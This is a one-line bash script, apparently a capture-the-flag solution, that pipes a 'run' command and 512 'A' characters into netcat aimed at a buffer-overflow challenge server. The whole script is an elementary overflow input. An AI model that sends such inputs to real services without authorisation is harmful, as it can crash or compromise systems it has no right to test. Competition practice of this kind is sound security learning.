#!/bin/bash

(echo run; python -c 'print "A"*512') | nc buffer-overflow.ctfcompetition.com 1337
